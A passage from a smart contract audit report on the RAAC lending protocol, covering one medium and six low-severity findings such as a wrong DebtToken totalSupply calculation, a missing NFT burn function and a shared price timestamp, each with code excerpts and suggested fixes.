Manual Code Review and Foundry

### 06. Recommended Mitigation

1. Modify `closeLiquidation` to allow repayment of debt or addition of collateral to improve the user’s health factor rather than strictly checking `DUST_THRESHOLD`.
2. Reassess user health factors during finalizeLiquidation. If the user’s new health factor is sufficient, do not seize all collateral.
3. Ensure that the contract supports partial repayment or additional collateral deposits during the grace period, allowing users to exit liquidation more dynamically.

## <a id='M-09'></a>M-09. Incorrect DebtToken::totalSupply Calculation            



### 01. Relevant GitHub Links

&#x20;

* [DebtToken.sol#L232](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/DebtToken.sol#L232)

### 02. Summary

The `totalSupply()` function in `DebtToken` returns the wrong total supply because it uses `rayDiv` instead of `rayMul`. This leads to an incorrect result when the actual intention is to scale the supply upwards by `getNormalizedDebt()`. As a result, any logic depending on this total supply value—such as updating `reserve.totalUsage` in the lending pool—receives invalid data.

### 03. Vulnerability Details

```Solidity
/**
 * @notice Returns the scaled total supply
 * @return The total supply (scaled by the usage index)
 */
function totalSupply() public view override(ERC20, IERC20) returns (uint256) {
    uint256 scaledSupply = super.totalSupply();
    return scaledSupply.rayDiv(ILendingPool(_reservePool).getNormalizedDebt());
}
```

`super.totalSupply()` already returns a scaled amount. To get the correct total supply, it should multiply by `getNormalizedDebt()` rather than dividing by it.

The returned total supply becomes incorrect, which cascades into other functions (such as `mint` and `burn` return values) and distorts how `reserve.totalUsage` is determined in the lending pool contract.

### 04. Impact

* Incorrect Accounting: Any calculation relying on DebtToken::totalSupply() is skewed.
* Misleading Reserve Data: The lending pool’s `reserve.totalUsage` uses a wrong total supply and may trigger logic errors related to interest rate calculations or debt thresholds.
* Possible Financial Mismatch: Over time, improper debt or interest calculations can lead to financial imbalances and affect user positions.

### 05. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```diff
/**
 * @notice Returns the scaled total supply
 * @return The total supply (scaled by the usage index)
 */
function totalSupply() public view override(ERC20, IERC20) returns (uint256) {
    uint256 scaledSupply = super.totalSupply();
-   return scaledSupply.rayDiv(ILendingPool(_reservePool).getNormalizedDebt());
+   return scaledSupply.rayMul(ILendingPool(_reservePool).getNormalizedDebt());
}
```
<br>

# Low Risk Findings

## <a id='L-01'></a>L-01. Missing Burn Functionality in RAACNFT            



### 01. Relevant GitHub Links

&#x20;

* [RAACNFT.sol#L75](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RAACNFT.sol#L75)

### 02. Summary

The website mentions that users can burn NFTs to redeem assets. However, the contract code does not provide a burn function. Instead, `_update` prevents sending NFTs to the zero address, effectively blocking any potential burning operation.

### 03. Vulnerability Details

The site  explains that you can burn NFT tokens and actually receive assets for them.

> Real estate is held in a corporate structure that is designed to protect Regna Minima NFT holders. Eligible users can burn the Regna Minima NFT to redeem the real estate title.

However, the actual NFT implementation not only doesn't have a burn function, but it also overrides the `_update` function, making it impossible to burn.

```Solidity
function _update(address to, uint256 tokenId, address auth) internal override(ERC721, ERC721Enumerable) returns (address) {
    if (to == address(0)) revert RAACNFT__InvalidAddress();
    return super._update(to, tokenId, auth);
}

```

### 04. Impact

Users cannot burn their NFTs to redeem real estate or other assets, contrary to the documentation and advertised functionality.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

Implement a burn function andadd a mitigation to prevent the mint function from re-minting tokens that have already been burned.

## <a id='L-02'></a>L-02. Missing Index Updates in RToken and DebtToken Contracts            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L96](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L96)
* [DebtToken.sol#L119](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/DebtToken.sol#L119)

### 02. Summary

Certain index update functions (updateUsageIndex, updateLiquidityIndex) exist in the RToken and DebtToken contracts, but there is no ReservePool code that actually calls these functions. As a result, the index values remain unchanged, potentially causing confusion for anyone relying on these values off-chain.

### 03. Vulnerability Details

`updateUsageIndex` and `updateLiquidityIndex` can only be called by the ReservePool address, but the ReservePool contract does not include any function to update these indices. Although the RToken contract includes functions to read these values, they are never actually updated in practice.

```Solidity
/**
 * @notice Updates the usage index
 * @param newUsageIndex The new usage index
 */
function updateUsageIndex(uint256 newUsageIndex) external override onlyReservePool {
    if (newUsageIndex < _usageIndex) revert InvalidAmount();
    _usageIndex = newUsageIndex;
    emit UsageIndexUpdated(newUsageIndex);
}
```

```Solidity
/**
 * @notice Updates the liquidity index
 * @param newLiquidityIndex The new liquidity index
 */
function updateLiquidityIndex(uint256 newLiquidityIndex) external override onlyReservePool {
    if (newLiquidityIndex < _liquidityIndex) revert InvalidAmount();
    _liquidityIndex = newLiquidityIndex;
    emit LiquidityIndexUpdated(newLiquidityIndex);
}
```

In the current implementation, these index variables are not used in any calculation in the RToken or DebtToken contracts. They simply remain set to their default value.

### 04. Impact

* Off-chain processes or UIs that rely on these index values can receive incorrect information.
* Users may become confused if the displayed indices are never updated.

### 05. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

Add functionality in the ReservePool contract to properly call updateUsageIndex and updateLiquidityIndex. Ensuring these values are updated will help prevent misinformation and confusion for anyone relying on the index data.

## <a id='L-03'></a>L-03. Incorrect Comparison Between Scaled and Unscaled Amounts in _repay            



### 01. Relevant GitHub Links

&#x20;

* [LendingPool.sol#L398](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L398)

### 02. Summary

When a user repays their borrowed amount, the internal `_repay` function mistakenly compares `userScaledDebt` (scaled) to amount (unscaled) to compute `actualRepayAmount`. This results in a wrong value for `actualRepayAmount`, though it is not used to burn the debt tokens. The code still calls burn with the original amount, so there is no severe impact. However, it is a clear incorrect implementation.

### 03. Vulnerability Details

```Solidity
function _repay(uint256 amount, address onBehalfOf) internal {
    if (amount == 0) revert InvalidAmount();
    if (onBehalfOf == address(0)) revert AddressCannotBeZero();

    UserData storage user = userData[onBehalfOf];

    // Update reserve state before repayment
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Calculate the user's debt (for the onBehalfOf address)
    uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
    uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);

    // If amount is greater than userDebt, cap it at userDebt
@>  uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;

    uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);

    // Burn DebtTokens from the user whose debt is being repaid (onBehalfOf)
    // is not actualRepayAmount because we want to allow paying extra dust and we will then cap there
    (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) = 
        IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);
```

* amount is an underlying (unscaled) value.
* userScaledDebt is a scaled value.
* Comparing these two different representations leads to an incorrect calculation of actualRepayAmount.
* Despite this error, burn is called with the original amount, so the protocol still functions normally.

### 04. Impact

* The bug is low severity since the repayment flow uses burn(..., amount, ...) rather than the incorrect actualRepayAmount.
* It remains a code inconsistency that can cause confusion or bugs if logic changes in the future.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

```diff
function _repay(uint256 amount, address onBehalfOf) internal {
    if (amount == 0) revert InvalidAmount();
    if (onBehalfOf == address(0)) revert AddressCannotBeZero();

    UserData storage user = userData[onBehalfOf];

    // Update reserve state before repayment
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Calculate the user's debt (for the onBehalfOf address)
    uint256. userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
    uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);

    // If amount is greater than userDebt, cap it at userDebt
-   uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;
+   uint256 actualRepayAmount = amount > userDebt ? userDebt : amount;

    uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);

    // Burn DebtTokens from the user whose debt is being repaid (onBehalfOf)
    // is not actualRepayAmount because we want to allow paying extra dust and we will then cap there
    (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) = 
        IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);
```

## <a id='L-04'></a>L-04. If the Rtoken Contract is minted with 0 amount, an invalid value is returned.            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L121](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L121)

### 02. Summary

If you `mint` 0 amount in the Rtoken Contract, an invalid value will be returned.

### 03. Vulnerability Details

This is a `Rtoken::burn` function.

```Solidity
function burn(
    address from,
    address receiverOfUnderlying,
    uint256 amount,
    uint256 index
) external override onlyReservePool returns (uint256, uint256, uint256) {
    if (amount == 0) {
@>      return (0, totalSupply(), 0);
    }
    ...
```

Since the second return value is total supply, the totalSupply() function is doing a good job of returning it.

```Solidity
 * @return A tuple containing:
 *         - uint256: The amount of scaled tokens burned
 *         - uint256: The new total supply after burning
 *         - uint256: The amount of underlying asset transferred
```

However, where the total supply of the `Rtoken::mint` function should be returned, it returns `0` instead of `totalSupply()`.

```Solidity
function mint(
    address caller,
    address onBehalfOf,
    uint256 amountToMint,
    uint256 index
) external override onlyReservePool returns (bool, uint256, uint256, uint256) {
    if (amountToMint == 0) {
@>      return (false, 0, 0, 0);
    }
    ...
```

Annotation for the return value of the `Rtoken::mint` function.

```Solidity
 * @return A tuple containing:
 *         - bool: True if this is the first mint for the recipient, false otherwise
 *         - uint256: The amount of scaled tokens minted
 *         - uint256: The new total supply after minting
 *         - uint256: The amount of underlying tokens minted
 */
```

Also, the mint function unconditionally returns false for the `bool: True if this is the first mint for the recipient, false otherwise` when amountToMint is 0. And this problem also exists in the `DebtToken::mint` function.

### 04. Impact

* LendingPool using rTokens prevents minting amounts less than or equal to 1, but this is an obvious misimplementation and a low vulnerability.

### 05. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```diff
function mint(
    address caller,
    address onBehalfOf,
    uint256 amountToMint,
    uint256 index
) external override onlyReservePool returns (bool, uint256, uint256, uint256) {
    if (amountToMint == 0) {
-       return (false, 0, 0, 0);
+       return (false, 0, totalSupply(), 0);
    }
    ...
```

## <a id='L-05'></a>L-05. Unreachable rescueToken Function in RToken Contract            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L337](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L337)

### 02. Summary

The `rescueToken` function in the RToken contract is restricted by the onlyReservePool modifier, implying it can only be called by the `ReservePool`. However, since the ReservePool contract does not implement any function to invoke rescueToken, this functionality is effectively unavailable. Consequently, `_assetAddress` tokens sent to the RToken contract cannot be rescued.

### 03. Vulnerability Details

The `rescueToken` function, designed to retrieve mistakenly sent tokens (except for the main asset), is never actually callable because there is no code path in the ReservePool contract to execute it. Although the onlyReservePool modifier intends to restrict usage, it also prevents legitimate rescue attempts, as the ReservePool lacks an interface or function to trigger this rescue.

```Solidity
/**
 * @notice Rescue tokens mistakenly sent to this contract
 * @dev Only callable by the Reserve Pool. Cannot rescue the main asset.
 * @param tokenAddress The address of the ERC20 token
 * @param recipient The address to send the rescued tokens to
 * @param amount The amount of tokens to rescue
 */
function rescueToken(address tokenAddress, address recipient, uint256 amount) external onlyReservePool {
    if (recipient == address(0)) revert InvalidAddress();
    if (tokenAddress == _assetAddress) revert CannotRescueMainAsset();
    IERC20(tokenAddress).safeTransfer(recipient, amount);
}
```

### 04. Impact

Tokens that are mistakenly transferred to RToken remain irretrievable, limiting recovery options.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

Implement a function in the ReservePool that can invoke rescueToken

## <a id='L-06'></a>L-06. Inaccurate Update Timestamp for Token Prices            



### 01. Relevant GitHub Links

- [RAACHousePrices.sol#L37](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/primitives/RAACHousePrices.sol#L37)

### 02. Summary

The getLatestPrice function returns a timestamp that is updated globally for any token price change. This results in the function returning an incorrect timestamp when querying specific token IDs.

### 03. Vulnerability Details

```Solidity
/**
 * @notice Retrieves the latest price and update timestamp for a given token
 * @param _tokenId The ID of the RAAC token
 * @return The latest price and the timestamp of the last update
 *
 * Returns token-specific update timestamp
 */
function getLatestPrice(
    uint256 _tokenId
) external view returns (uint256, uint256) {
    return (tokenToHousePrice[_tokenId], lastUpdateTimestamp);
}

```

* The contract stores only one lastUpdateTimestamp for all tokens.
* Whenever any token’s price is updated, the single lastUpdateTimestamp is overwritten.
* Calling `getLatestPrice(_tokenId)` retrieves the correct price for the given \_tokenId but an irrelevant timestamp that might correspond to a different token’s update event.

### 04. Impact

Users or external contracts relying on token-specific timestamps may be misled by this global timestamp. This could cause confusion or errors in scenarios where accurate token price update times are critical for business logic or audits.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

* Introduce a mapping that stores an individual updateTimestamp for each token ID.



